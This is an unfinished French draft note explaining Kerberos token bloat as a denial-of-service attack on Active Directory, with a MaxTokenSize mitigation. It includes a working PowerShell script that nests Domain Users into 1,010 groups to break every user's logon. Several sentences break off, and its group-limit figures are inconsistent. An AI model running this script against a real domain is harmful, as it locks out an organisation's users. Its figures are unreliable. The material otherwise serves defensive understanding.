Sources :

- https://pentera.io/fr/resources/research/dos-attack-active-directory-sid-exploitation/
- https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/kerberos-authentication-problems-if-user-belongs-to-groups
- https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/logging-on-user-account-fails

## Principe

### Contenu d'un ticket Kerberos

Lorsqu'un utilisateur s'authentifie dans un domaine Active Directory, celui-ci reçoit un ticket Kerberos qui va lui permettre d'accéder à des ressources (partage de fichiers, ouverture de session...). Ce ticket Kerberos contient plusieurs éléments essentiels comme le nom d'utilisateur et le domaine, la durée de validité du ticket mais aussi l'ensemble des privilèges que celui-ci possède (via ses groupes ou ses identités).

C'est la partie PAC (Privilege Attribute Certificate) qui va servir de "passeport" pour attester de tous les accès de l'utilisateur. Celui-ci peut contenir :

- Le SID de l'utilisateur
- Les SIDHistory de l'utilisateur (ses autres identités issues d'anciennes forêts)
- Les appartenances de l'utilisateur à des groupes du domaine
- Les appartenances de l'utilisateur à des groupes d'un autre domaine

### Limites du ticket

Tout cela à un poids (en octet), plus ou moins important en fonction du nombre de SIDHistory et d'appartenance à des groupes de l'utilisateur. Le poids d'un ticket peut se calculer de cette manière :

```plaintext
1200 + 40d + 8s
```

- **1200** : correspond à l'entête imcompressible du ticket, ce nombre peut varier
- **d** : la somme des SIDHistory de l'utilisateur et l'appartenance à des groupes d'un autre domaine
- **s** : la somme des appartenances à des groupes du domaine

Source officielle : [Kerberos authentication problems - Windows Server \| Microsoft Learn](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/kerberos-authentication-problems-if-user-belongs-to-groups#calculating-the-maximum-token-size)

### Cas pratique

Prenons l'exemple du compte Administrator (SID 500) d'un nouveau domaine Active Directory. Le calcul de la variable **d** est rapide puisque celui-ci n'a aucun SIDHistory ni appartenance à des groupes d'un autre domaine.

Pour la variable **s** en revanche, le compte est membre des groupes suivants :

- Domain Users (via le groupe primaire)
- Group Policy Creator Owners
- Domain Admins
- Enterprise Admins
- Schema Admins
- Denied RODC Password Replication Group (via imbrication)
- Users (via imbrication)
- Administrators (via imbrication)

On obtient alors 8 groupes du domaine. On trouve alors la taille théorique du ticket : 1 264 octets.

```powershell
$d = 0
$s = 8
1200 + 40*$d + 8*$s
```







 Depuis Windows Server 2012 & Windows 8, la taille maximum du ticket Kerberos est de 48 000 octets, et

> 1200 + (40 x appartenance à des groupes d'autres domaines + SIDHistory) + (8 x appartenance à un groupe du domaine)

L'idée du **Kerberos Token Bloat**, c'est d'alourdir le ticket Kerberos en ajoutant un maximum de groupes un ou plusieurs utilisateurs pour que le poids du ticket dépasse la limite maximum autorisé par Windows.





Lorsqu'un ticket Kerberos est délivré à un utilisateur, 

Lorsqu'un utilisateur s'authentifie, un ticket Kerberos est généré. Ce ticket 

Le nombre maximum de groupes qu’un utilisateur Active Directory peut avoir avant de rencontrer des problèmes de connexion (« too many security IDs ») dépend de la taille maximale du ticket Kerberos (le « token de sécurité »).

Limite classique :

Par défaut, la taille maximale du token Kerberos est de 12 000 octets (peut être augmentée jusqu’à 48 000).
En pratique, cela correspond à environ 1 015 groupes (groupes globaux, universels et locaux confondus) pour un utilisateur.

- Au-delà de cette limite, l’utilisateur ne pourra plus se connecter à certains services (notamment via Kerberos) et recevra des erreurs du type : **During a logon attempt, the user's security context accumulated too many security IDs.**

Résumé :

- Environ 1 010 groupes maximum par utilisateur avant d’avoir des problèmes de connexion liés à la taille du token Kerberos

- Cette limite peut varier selon la configuration de la taille du token sur les DC et les clients.

La limite concerne tous les groupes dont l’utilisateur est membre, y compris :

Les groupes où il est membre direct et
Les groupes où il est membre de façon indirecte (par récursivité)
Autrement dit, tous les groupes imbriqués sont pris en compte dans le calcul de la taille du token Kerberos.
C’est la somme totale des appartenances, directes et indirectes, qui compte.

## Calcul du nombre



(48000-1200) / 8 = 5850 groupes

## Méthode pour tout casser

L'objectif est très simple : on va créer au moins 1010 groupes dédiés 

Créer 1010 groupes locaux, ajouter ces groupes en tant que membre de Domain Users :

```powershell
1..1010 | ForEach-Object {
    $i = [string]$_
    $name = 'krbdos_'
    $name += switch ($i.Length) {
        1 { "000$i" }
        2 { "00$i" }
        3 { "0$i" }
        default { $i }
    }
    $desc = 'Kerberos Denial of Service'
    New-ADGroup -GroupCategory Security -GroupScope DomainLocal -Name $name -Description $desc
    Add-ADGroupMember $name -Members 'Domain Users'
}
```

On vérifie le nombre de groupes auquel appartient 'Domain Users' avec la commande suivante :

```powershell
(Get-ADGroup 'Domain Users' -Properties MemberOf).MemberOf | Measure-Object
```

## Méthodes de contournement

### Augmentation du MaxTokenSize



Pour augmenter cette limite, il faut augmenter la taille maximale du token Kerberos sur les contrôleurs de domaine et les clients Windows.

Procédure :

1. Modifier la clé de registre suivante sur les DC et les clients :
2. Créer ou modifier la valeur DWORD :

- Nom : MaxTokenSize
- Valeur : jusqu’à 48000 (décimal) maximum

1. Redémarrer les machines concernées pour que la modification soit prise en compte.

Exemple PowerShell :

```powershell
$splat = @{
  Path = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters'
  Name = 'MaxTokenSize'
  PropertyType = 'DWord'
  Value = 48000
  Force = $true
}
New-ItemProperty @splat
```

> **Attention :** Même en augmentant cette valeur, il existe toujours une limite physique (taille du ticket, MTU réseau, etc.). Il est préférable de revoir la gestion des groupes si vous approchez cette limite, plutôt que de l’augmenter indéfiniment.

